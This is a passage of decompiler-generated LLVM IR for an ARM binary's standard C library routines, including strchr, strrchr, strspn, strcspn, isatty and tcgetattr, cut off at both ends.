  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 5, 2, 3, 4, 6 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_16fc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16f54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16ee8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16e88, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_16e14, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_16dd8, { 1, 0 }
  uselistorder label %dec_label_pc_16dc4, { 1, 0 }
  uselistorder label %dec_label_pc_16d84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16d18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16cac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16c4c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_16c1c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_16bb8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_16b78, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_16fe4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_16fe4 = phi i32 [ %v0_16fe4.pre, %bb ], [ %v5_16fe4, %bb3 ]
  %v0_16fe0 = phi i32 [ %tmp, %bb ], [ %v5_16fe0, %bb3 ]
  %v1_16fe0 = inttoptr i32 %v0_16fe0 to i8*
  %v2_16fe0 = load i8, i8* %v1_16fe0, align 1
  %v1_16fe4 = inttoptr i32 %v0_16fe4 to i8*
  %v2_16fe4 = load i8, i8* %v1_16fe4, align 1
  %v3_16fe4 = zext i8 %v2_16fe4 to i32
  %v2_16fe8 = icmp eq i8 %v2_16fe0, 0
  br i1 %v2_16fe8, label %.dec_label_pc_16ff4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_16fe4 = add i32 %v0_16fe4, 1
  %v5_16fe0 = add i32 %v0_16fe0, 1
  %v3_16fe0 = zext i8 %v2_16fe0 to i32
  %v10_16fec = icmp eq i8 %v2_16fe0, %v2_16fe4
  br i1 %v10_16fec, label %entry, label %dec_label_pc_16ff4

.dec_label_pc_16ff4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_16ff4

dec_label_pc_16ff4:                               ; preds = %bb3, %.dec_label_pc_16ff4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_16ff4_crit_edge ], [ %v3_16fe0, %bb3 ]
  %v2_16ff4.pre-phi = sub nsw i32 %.pn, %v3_16fe4
  ret i32 %v2_16ff4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_16fe0, { 0, 2, 1 }
  uselistorder i32 %v0_16fe0, { 1, 0 }
  uselistorder i32 %v0_16fe4, { 1, 0 }
  uselistorder label %dec_label_pc_16ff4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_17064 = urem i32 %arg1, 256
  %v0_170843 = load i32, i32* @r0, align 4
  %v1_170844 = urem i32 %v0_170843, 4
  %v2_170845 = icmp eq i32 %v1_170844, 0
  br i1 %v2_170845, label %dec_label_pc_1708c, label %dec_label_pc_1706c

dec_label_pc_1706c:                               ; preds = %entry, %dec_label_pc_17080
  %v0_17080 = phi i32 [ %v1_17080, %dec_label_pc_17080 ], [ %v0_170843, %entry ]
  %v1_1706c = inttoptr i32 %v0_17080 to i8*
  %v2_1706c = load i8, i8* %v1_1706c, align 1
  %v3_1706c = zext i8 %v2_1706c to i32
  %v9_17070 = icmp eq i32 %v3_1706c, %v1_17064
  br i1 %v9_17070, label %dec_label_pc_17140, label %dec_label_pc_17078

dec_label_pc_17078:                               ; preds = %dec_label_pc_1706c
  %v2_17078 = icmp eq i8 %v2_1706c, 0
  br i1 %v2_17078, label %dec_label_pc_1713c, label %dec_label_pc_17080

dec_label_pc_17080:                               ; preds = %dec_label_pc_17078
  %v1_17080 = add i32 %v0_17080, 1
  %v1_17084 = urem i32 %v1_17080, 4
  %v2_17084 = icmp eq i32 %v1_17084, 0
  br i1 %v2_17084, label %dec_label_pc_1708c, label %dec_label_pc_1706c

dec_label_pc_1708c:                               ; preds = %dec_label_pc_17080, %entry
  %v0_17090 = phi i32 [ %v0_170843, %entry ], [ %v1_17080, %dec_label_pc_17080 ]
  %v4_1708c = mul nuw nsw i32 %v1_17064, 256
  %v5_1708c = or i32 %v4_1708c, %v1_17064
  %v4_17094 = mul i32 %v5_1708c, 65536
  %v5_17094 = or i32 %v4_17094, %v5_1708c
  br label %dec_label_pc_17098

dec_label_pc_17098:                               ; preds = %dec_label_pc_17134, %dec_label_pc_170d4, %dec_label_pc_1708c
  %v0_170fc = phi i32 [ %v0_17090, %dec_label_pc_1708c ], [ %v4_17098, %dec_label_pc_170d4 ], [ %v4_17098, %dec_label_pc_17134 ]
  %v1_17098 = inttoptr i32 %v0_170fc to i32*
  %v2_17098 = load i32, i32* %v1_17098, align 4
  %v4_17098 = add i32 %v0_170fc, 4
  %v2_170a0 = xor i32 %v2_17098, %v5_17094
  %v2_170ac = add i32 %v2_17098, 2130640639
  %v1_170b0 = sub i32 -1, %v2_17098
  %v2_170b4 = xor i32 %v2_170ac, %v1_170b0
  %v2_170c0 = and i32 %v2_170b4, -2130640640
  store i32 %v2_170c0, i32* @r1, align 4
  %v2_170c8 = icmp eq i32 %v2_170c0, 0
  br i1 %v2_170c8, label %dec_label_pc_170d4, label %dec_label_pc_170dc

dec_label_pc_170d4:                               ; preds = %dec_label_pc_17098
  %v2_170a4 = add i32 %v2_170a0, 2130640639
  %v1_170bc = sub i32 -1, %v2_170a0
  %v2_170c4 = xor i32 %v2_170a4, %v1_170bc
  %v2_170cc = and i32 %v2_170c4, -2130640640
  %v2_170d4 = icmp eq i32 %v2_170cc, 0
  br i1 %v2_170d4, label %dec_label_pc_17098, label %dec_label_pc_170dc

dec_label_pc_170dc:                               ; preds = %dec_label_pc_17098, %dec_label_pc_170d4
  %v2_170dc = inttoptr i32 %v0_170fc to i8*
  %v3_170dc = load i8, i8* %v2_170dc, align 1
  %v4_170dc = zext i8 %v3_170dc to i32
  %v9_170e0 = icmp eq i32 %v4_170dc, %v1_17064
  br i1 %v9_170e0, label %dec_label_pc_17140, label %dec_label_pc_170ec

dec_label_pc_170ec:                               ; preds = %dec_label_pc_170dc
  %v2_170ec = icmp eq i8 %v3_170dc, 0
  br i1 %v2_170ec, label %dec_label_pc_1713c, label %dec_label_pc_170f4

dec_label_pc_170f4:                               ; preds = %dec_label_pc_170ec
  %v1_170f4 = add i32 %v0_170fc, 1
  %v2_170f4 = inttoptr i32 %v1_170f4 to i8*
  %v3_170f4 = load i8, i8* %v2_170f4, align 1
  %v4_170f4 = zext i8 %v3_170f4 to i32
  %v9_170f8 = icmp eq i32 %v4_170f4, %v1_17064
  br i1 %v9_170f8, label %dec_label_pc_17140, label %dec_label_pc_17104

dec_label_pc_17104:                               ; preds = %dec_label_pc_170f4
  %v2_17104 = icmp eq i8 %v3_170f4, 0
  br i1 %v2_17104, label %dec_label_pc_1713c, label %dec_label_pc_1710c

dec_label_pc_1710c:                               ; preds = %dec_label_pc_17104
  %v1_1710c = add i32 %v0_170fc, 2
  %v2_1710c = inttoptr i32 %v1_1710c to i8*
  %v3_1710c = load i8, i8* %v2_1710c, align 1
  %v4_1710c = zext i8 %v3_1710c to i32
  %v9_17110 = icmp eq i32 %v4_1710c, %v1_17064
  br i1 %v9_17110, label %dec_label_pc_17140, label %dec_label_pc_1711c

dec_label_pc_1711c:                               ; preds = %dec_label_pc_1710c
  %v2_1711c = icmp eq i8 %v3_1710c, 0
  br i1 %v2_1711c, label %dec_label_pc_1713c, label %dec_label_pc_17124

dec_label_pc_17124:                               ; preds = %dec_label_pc_1711c
  %v1_17124 = add i32 %v0_170fc, 3
  %v2_17124 = inttoptr i32 %v1_17124 to i8*
  %v3_17124 = load i8, i8* %v2_17124, align 1
  %v4_17124 = zext i8 %v3_17124 to i32
  %v9_17128 = icmp eq i32 %v4_17124, %v1_17064
  br i1 %v9_17128, label %dec_label_pc_17140, label %dec_label_pc_17134

dec_label_pc_17134:                               ; preds = %dec_label_pc_17124
  %v2_17134 = icmp eq i8 %v3_17124, 0
  br i1 %v2_17134, label %dec_label_pc_1713c, label %dec_label_pc_17098

dec_label_pc_1713c:                               ; preds = %dec_label_pc_17078, %dec_label_pc_17134, %dec_label_pc_1711c, %dec_label_pc_17104, %dec_label_pc_170ec
  br label %dec_label_pc_17140

dec_label_pc_17140:                               ; preds = %dec_label_pc_1706c, %dec_label_pc_17124, %dec_label_pc_1710c, %dec_label_pc_170f4, %dec_label_pc_170dc, %dec_label_pc_1713c
  %v1_17144 = phi i32 [ 0, %dec_label_pc_1713c ], [ %v1_17124, %dec_label_pc_17124 ], [ %v1_1710c, %dec_label_pc_1710c ], [ %v1_170f4, %dec_label_pc_170f4 ], [ %v0_170fc, %dec_label_pc_170dc ], [ %v0_17080, %dec_label_pc_1706c ]
  ret i32 %v1_17144

; uselistorder directives
  uselistorder i32 %v4_17098, { 1, 0 }
  uselistorder i32 %v2_17098, { 0, 2, 1 }
  uselistorder i32 %v0_170fc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1708c, { 1, 0 }
  uselistorder i32 %v1_17080, { 1, 0, 2 }
  uselistorder i32 %v0_170843, { 2, 1, 0 }
  uselistorder i32 %v1_17064, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_17140, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1713c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_170dc, { 1, 0 }
  uselistorder label %dec_label_pc_1706c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_17154 = urem i32 %arg1, 256
  %v0_171742 = load i32, i32* @r0, align 4
  %v1_171743 = urem i32 %v0_171742, 4
  %v2_171744 = icmp eq i32 %v1_171743, 0
  br i1 %v2_171744, label %dec_label_pc_1717c, label %dec_label_pc_1715c

dec_label_pc_1715c:                               ; preds = %entry, %dec_label_pc_17170
  %v0_17170 = phi i32 [ %v1_17170, %dec_label_pc_17170 ], [ %v0_171742, %entry ]
  %v1_1715c = inttoptr i32 %v0_17170 to i8*
  %v2_1715c = load i8, i8* %v1_1715c, align 1
  %v3_1715c = zext i8 %v2_1715c to i32
  %v9_17160 = icmp eq i32 %v3_1715c, %v1_17154
  br i1 %v9_17160, label %dec_label_pc_1722c, label %dec_label_pc_17168

dec_label_pc_17168:                               ; preds = %dec_label_pc_1715c
  %v2_17168 = icmp eq i8 %v2_1715c, 0
  br i1 %v2_17168, label %dec_label_pc_1722c, label %dec_label_pc_17170

dec_label_pc_17170:                               ; preds = %dec_label_pc_17168
  %v1_17170 = add i32 %v0_17170, 1
  %v1_17174 = urem i32 %v1_17170, 4
  %v2_17174 = icmp eq i32 %v1_17174, 0
  br i1 %v2_17174, label %dec_label_pc_1717c, label %dec_label_pc_1715c

dec_label_pc_1717c:                               ; preds = %dec_label_pc_17170, %entry
  %v0_17180 = phi i32 [ %v0_171742, %entry ], [ %v1_17170, %dec_label_pc_17170 ]
  %v4_1717c = mul nuw nsw i32 %v1_17154, 256
  %v5_1717c = or i32 %v4_1717c, %v1_17154
  %v4_17184 = mul i32 %v5_1717c, 65536
  %v5_17184 = or i32 %v4_17184, %v5_1717c
  br label %dec_label_pc_17188

dec_label_pc_17188:                               ; preds = %dec_label_pc_17224, %dec_label_pc_171c4, %dec_label_pc_1717c
  %v0_171ec = phi i32 [ %v0_17180, %dec_label_pc_1717c ], [ %v4_17188, %dec_label_pc_171c4 ], [ %v4_17188, %dec_label_pc_17224 ]
  %v1_17188 = inttoptr i32 %v0_171ec to i32*
  %v2_17188 = load i32, i32* %v1_17188, align 4
  %v4_17188 = add i32 %v0_171ec, 4
  %v2_17190 = xor i32 %v2_17188, %v5_17184
  %v2_1719c = add i32 %v2_17188, 2130640639
  %v1_171a0 = sub i32 -1, %v2_17188
  %v2_171a4 = xor i32 %v2_1719c, %v1_171a0
  %v2_171b0 = and i32 %v2_171a4, -2130640640
  store i32 %v2_171b0, i32* @r1, align 4
  %v2_171b8 = icmp eq i32 %v2_171b0, 0
  br i1 %v2_171b8, label %dec_label_pc_171c4, label %dec_label_pc_171cc

dec_label_pc_171c4:                               ; preds = %dec_label_pc_17188
  %v2_17194 = add i32 %v2_17190, 2130640639
  %v1_171ac = sub i32 -1, %v2_17190
  %v2_171b4 = xor i32 %v2_17194, %v1_171ac
  %v2_171bc = and i32 %v2_171b4, -2130640640
  %v2_171c4 = icmp eq i32 %v2_171bc, 0
  br i1 %v2_171c4, label %dec_label_pc_17188, label %dec_label_pc_171cc

dec_label_pc_171cc:                               ; preds = %dec_label_pc_17188, %dec_label_pc_171c4
  %v2_171cc = inttoptr i32 %v0_171ec to i8*
  %v3_171cc = load i8, i8* %v2_171cc, align 1
  %v4_171cc = zext i8 %v3_171cc to i32
  %v9_171d0 = icmp eq i32 %v4_171cc, %v1_17154
  br i1 %v9_171d0, label %dec_label_pc_1722c, label %dec_label_pc_171dc

dec_label_pc_171dc:                               ; preds = %dec_label_pc_171cc
  %v2_171dc = icmp eq i8 %v3_171cc, 0
  br i1 %v2_171dc, label %dec_label_pc_1722c, label %dec_label_pc_171e4

dec_label_pc_171e4:                               ; preds = %dec_label_pc_171dc
  %v1_171e4 = add i32 %v0_171ec, 1
  %v2_171e4 = inttoptr i32 %v1_171e4 to i8*
  %v3_171e4 = load i8, i8* %v2_171e4, align 1
  %v4_171e4 = zext i8 %v3_171e4 to i32
  %v9_171e8 = icmp eq i32 %v4_171e4, %v1_17154
  br i1 %v9_171e8, label %dec_label_pc_1722c, label %dec_label_pc_171f4

dec_label_pc_171f4:                               ; preds = %dec_label_pc_171e4
  %v2_171f4 = icmp eq i8 %v3_171e4, 0
  br i1 %v2_171f4, label %dec_label_pc_1722c, label %dec_label_pc_171fc

dec_label_pc_171fc:                               ; preds = %dec_label_pc_171f4
  %v1_171fc = add i32 %v0_171ec, 2
  %v2_171fc = inttoptr i32 %v1_171fc to i8*
  %v3_171fc = load i8, i8* %v2_171fc, align 1
  %v4_171fc = zext i8 %v3_171fc to i32
  %v9_17200 = icmp eq i32 %v4_171fc, %v1_17154
  br i1 %v9_17200, label %dec_label_pc_1722c, label %dec_label_pc_1720c

dec_label_pc_1720c:                               ; preds = %dec_label_pc_171fc
  %v2_1720c = icmp eq i8 %v3_171fc, 0
  br i1 %v2_1720c, label %dec_label_pc_1722c, label %dec_label_pc_17214

dec_label_pc_17214:                               ; preds = %dec_label_pc_1720c
  %v1_17214 = add i32 %v0_171ec, 3
  %v2_17214 = inttoptr i32 %v1_17214 to i8*
  %v3_17214 = load i8, i8* %v2_17214, align 1
  %v4_17214 = zext i8 %v3_17214 to i32
  %v9_17218 = icmp eq i32 %v4_17214, %v1_17154
  br i1 %v9_17218, label %dec_label_pc_1722c, label %dec_label_pc_17224

dec_label_pc_17224:                               ; preds = %dec_label_pc_17214
  %v2_17224 = icmp eq i8 %v3_17214, 0
  br i1 %v2_17224, label %dec_label_pc_1722c, label %dec_label_pc_17188

dec_label_pc_1722c:                               ; preds = %dec_label_pc_17168, %dec_label_pc_1715c, %dec_label_pc_17224, %dec_label_pc_17214, %dec_label_pc_1720c, %dec_label_pc_171fc, %dec_label_pc_171f4, %dec_label_pc_171e4, %dec_label_pc_171dc, %dec_label_pc_171cc
  %v1_17230 = phi i32 [ %v1_17214, %dec_label_pc_17224 ], [ %v1_17214, %dec_label_pc_17214 ], [ %v1_171fc, %dec_label_pc_1720c ], [ %v1_171fc, %dec_label_pc_171fc ], [ %v1_171e4, %dec_label_pc_171f4 ], [ %v1_171e4, %dec_label_pc_171e4 ], [ %v0_171ec, %dec_label_pc_171dc ], [ %v0_171ec, %dec_label_pc_171cc ], [ %v0_17170, %dec_label_pc_1715c ], [ %v0_17170, %dec_label_pc_17168 ]
  ret i32 %v1_17230

; uselistorder directives
  uselistorder i32 %v4_17188, { 1, 0 }
  uselistorder i32 %v2_17188, { 0, 2, 1 }
  uselistorder i32 %v0_171ec, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1717c, { 1, 0 }
  uselistorder i32 %v1_17170, { 1, 0, 2 }
  uselistorder i32 %v0_171742, { 2, 1, 0 }
  uselistorder i32 %v1_17154, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1722c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_171cc, { 1, 0 }
  uselistorder label %dec_label_pc_1715c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1723c = load i32, i32* @r4, align 4
  store i32 %v3_1723c, i32* %stack_var_-16, align 4
  %v6_1723c = load i32, i32* @r5, align 4
  %v9_1723c = load i32, i32* @r6, align 4
  %v0_17240 = load i32, i32* @r0, align 4
  %v0_17244 = load i32, i32* @r1, align 4
  store i32 %v0_17244, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_172608 = inttoptr i32 %v0_17240 to i8*
  %v2_172609 = load i8, i8* %v1_172608, align 1
  %v3_1726010 = zext i8 %v2_172609 to i32
  store i32 %v3_1726010, i32* @r1, align 4
  %v2_1726411 = icmp eq i8 %v2_172609, 0
  store i32 %v0_17244, i32* @r0, align 4
  %v1_1726c12 = add i32 %v0_17240, 1
  store i32 %v1_1726c12, i32* @r4, align 4
  br i1 %v2_1726411, label %dec_label_pc_17274, label %dec_label_pc_17250

dec_label_pc_17250:                               ; preds = %entry, %dec_label_pc_1725c
  %v3_1726014 = phi i32 [ %v3_17260, %dec_label_pc_1725c ], [ %v3_1726010, %entry ]
  %v0_1726813 = phi i32 [ %v0_17268.pre, %dec_label_pc_1725c ], [ %v0_17244, %entry ]
  %v2_17250 = call i32 @__GI_strchr(i32 %v0_1726813, i32 %v3_1726014)
  %v2_17254 = icmp eq i32 %v2_17250, 0
  %v0_1725c = load i32, i32* @r5, align 4
  br i1 %v2_17254, label %dec_label_pc_1725c, label %dec_label_pc_17274

dec_label_pc_1725c:                               ; preds = %dec_label_pc_17250
  %v1_1725c = add i32 %v0_1725c, 1
  %v0_17260.pre = load i32, i32* @r4, align 4
  %v0_17268.pre = load i32, i32* @r6, align 4
  store i32 %v1_1725c, i32* @r5, align 4
  %v1_17260 = inttoptr i32 %v0_17260.pre to i8*
  %v2_17260 = load i8, i8* %v1_17260, align 1
  %v3_17260 = zext i8 %v2_17260 to i32
  store i32 %v3_17260, i32* @r1, align 4
  %v2_17264 = icmp eq i8 %v2_17260, 0
  store i32 %v0_17268.pre, i32* @r0, align 4
  %v1_1726c = add i32 %v0_17260.pre, 1
  store i32 %v1_1726c, i32* @r4, align 4
  br i1 %v2_17264, label %dec_label_pc_17274, label %dec_label_pc_17250

dec_label_pc_17274:                               ; preds = %dec_label_pc_1725c, %dec_label_pc_17250, %entry
  %v0_17274 = phi i32 [ 0, %entry ], [ %v0_1725c, %dec_label_pc_17250 ], [ %v1_1725c, %dec_label_pc_1725c ]
  %v2_17278 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17278, i32* @r4, align 4
  store i32 %v6_1723c, i32* @r5, align 4
  store i32 %v9_1723c, i32* @r6, align 4
  ret i32 %v0_17274

; uselistorder directives
  uselistorder i32 %v3_17260, { 1, 0 }
  uselistorder i32 %v0_17268.pre, { 1, 0 }
  uselistorder i32 %v0_17260.pre, { 1, 0 }
  uselistorder label %dec_label_pc_17250, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17284 = urem i32 %arg2, 256
  store i32 %v1_17284, i32* @r4, align 4
  %v2_17284 = icmp eq i32 %v1_17284, 0
  br i1 %v2_17284, label %dec_label_pc_17298, label %dec_label_pc_172ac.preheader

dec_label_pc_172ac.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_172b43 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_17284)
  %v2_172b85 = icmp eq i32 %v2_172b43, 0
  br i1 %v2_172b85, label %dec_label_pc_172c0, label %dec_label_pc_172a4

dec_label_pc_17298:                               ; preds = %entry
  %v2_1729c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_172c4

dec_label_pc_172a4:                               ; preds = %dec_label_pc_172ac.preheader, %dec_label_pc_172a4
  %v2_172b46 = phi i32 [ %v2_172b4, %dec_label_pc_172a4 ], [ %v2_172b43, %dec_label_pc_172ac.preheader ]
  store i32 %v2_172b46, i32* @r5, align 4
  %v1_172a8 = add i32 %v2_172b46, 1
  store i32 %v1_172a8, i32* @r0, align 4
  %v0_172b0 = load i32, i32* @r4, align 4
  %v2_172b4 = call i32 @__GI_strchr(i32 %v1_172a8, i32 %v0_172b0)
  %v2_172b8 = icmp eq i32 %v2_172b4, 0
  br i1 %v2_172b8, label %dec_label_pc_172c0, label %dec_label_pc_172a4

dec_label_pc_172c0:                               ; preds = %dec_label_pc_172a4, %dec_label_pc_172ac.preheader
  %v0_172c0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_172c4

dec_label_pc_172c4:                               ; preds = %dec_label_pc_17298, %dec_label_pc_172c0
  %storemerge = phi i32 [ %v2_1729c, %dec_label_pc_17298 ], [ %v0_172c0, %dec_label_pc_172c0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_172b4, { 1, 0 }
  uselistorder i32 %v1_172a8, { 1, 0 }
  uselistorder i32 %v1_17284, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_172c4, { 1, 0 }
  uselistorder label %dec_label_pc_172a4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_173002 = load i32, i32* @r0, align 4
  %v1_173003 = inttoptr i32 %v0_173002 to i8*
  %v2_173004 = load i8, i8* %v1_173003, align 1
  %v2_173046 = icmp eq i8 %v2_173004, 0
  br i1 %v2_173046, label %dec_label_pc_17310, label %dec_label_pc_172e4.preheader

dec_label_pc_172dc:                               ; preds = %dec_label_pc_172e4
  %v1_172ec = add i32 %v0_172ec, 1
  %v9_172dc = icmp eq i8 %v0_172dc10.in, %v2_172e4
  br i1 %v9_172dc, label %dec_label_pc_172f8, label %dec_label_pc_172e4

dec_label_pc_172e4:                               ; preds = %dec_label_pc_172e4.preheader, %dec_label_pc_172dc
  %v0_172ec = phi i32 [ %tmp, %dec_label_pc_172e4.preheader ], [ %v1_172ec, %dec_label_pc_172dc ]
  %v1_172e4 = inttoptr i32 %v0_172ec to i8*
  %v2_172e4 = load i8, i8* %v1_172e4, align 1
  %v2_172e8 = icmp eq i8 %v2_172e4, 0
  br i1 %v2_172e8, label %dec_label_pc_17310, label %dec_label_pc_172dc

dec_label_pc_172f8:                               ; preds = %dec_label_pc_172dc
  %v1_172f8 = add i32 %v0_172f8, 1
  %v1_172fc = add i32 %v0_172fc, 1
  %v1_17300 = inttoptr i32 %v1_172fc to i8*
  %v2_17300 = load i8, i8* %v1_17300, align 1
  %v2_17304 = icmp eq i8 %v2_17300, 0
  br i1 %v2_17304, label %dec_label_pc_17310, label %dec_label_pc_172e4.preheader

dec_label_pc_172e4.preheader:                     ; preds = %entry, %dec_label_pc_172f8
  %v0_172fc = phi i32 [ %v1_172fc, %dec_label_pc_172f8 ], [ %v0_173002, %entry ]
  %v0_172f8 = phi i32 [ %v1_172f8, %dec_label_pc_172f8 ], [ 0, %entry ]
  %v0_172dc10.in = phi i8 [ %v2_17300, %dec_label_pc_172f8 ], [ %v2_173004, %entry ]
  br label %dec_label_pc_172e4

dec_label_pc_17310:                               ; preds = %dec_label_pc_172f8, %dec_label_pc_172e4, %entry
  %v0_17310 = phi i32 [ 0, %entry ], [ %v0_172f8, %dec_label_pc_172e4 ], [ %v1_172f8, %dec_label_pc_172f8 ]
  ret i32 %v0_17310

; uselistorder directives
  uselistorder i8 %v2_172e4, { 1, 0 }
  uselistorder i32 %v0_172ec, { 1, 0 }
  uselistorder label %dec_label_pc_172e4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_17324 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_17324, i32* @r1, align 4
  %v0_17328 = call i32 @__GI_tcgetattr()
  %v1_1732c = sub i32 1, %v0_17328
  %v2_1732c = icmp ult i32 %v0_17328, 2
  br i1 %v2_1732c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1733c = phi i32 [ %v1_1732c, %entry ], [ 0, %bb ]
  ret i32 %v1_1733c

; uselistorder directives
  uselistorder i32 %v0_17328, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_17340 = load i32, i32* @r4, align 4
  %v6_17340 = load i32, i32* @r5, align 4
  %v9_17340 = load i32, i32* @r6, align 4
  %v2_17348 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1734c = load i32, i32* @r1, align 4
  store i32 %v0_1734c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_17358 = load i32, i32* @r0, align 4
  %v3_17358 = call i32 @ioctl(i32 %v0_17358, i32 21505, i32 %v2_17348)
  store i32 %v3_17358, i32* %r0.global-to-local, align 4
  store i32 %v3_17358, i32* @r5, align 4
  %v2_1735c = icmp eq i32 %v3_17358, 0
  br i1 %v2_1735c, label %dec_label_pc_17364, label %dec_label_pc_173a8

dec_label_pc_17364:                               ; preds = %entry
  %v4_17370 = zext i8 %tmp to i32
  store i32 %v4_17370, i32* @ip, align 4
  %v3_17374 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_17374, i32* @r3, align 4
  %v1_17378 = load i32, i32* @r4, align 4
  %v2_17378 = add i32 %v1_17378, 4
  %v3_17378 = inttoptr i32 %v2_17378 to i32*
  %v0_1737c = load i32, i32* %r1.global-to-local, align 4
  %v1_1737c = load i32, i32* @r4, align 4
  %v2_1737c = add i32 %v1_1737c, 8
  %v3_1737c = inttoptr i32 %v2_1737c to i32*
  store i32 %v0_1737c, i32* %v3_1737c, align 4
  %v0_17380 = load i32, i32* %r0.global-to-local, align 4
  %v1_17380 = load i32, i32* @r4, align 4
  %v2_17380 = add i32 %v1_17380, 12
  %v3_17380 = inttoptr i32 %v2_17380 to i32*
  store i32 %v0_17380, i32* %v3_17380, align 4
  %v2_17384 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17384, i32* @r1, align 4
  %v1_1738c = load i32, i32* @r4, align 4
  %v2_1738c = inttoptr i32 %v1_1738c to i32*
  store i32 %v3_17374, i32* %v2_1738c, align 4
  %v0_17390 = load i32, i32* @ip, align 4
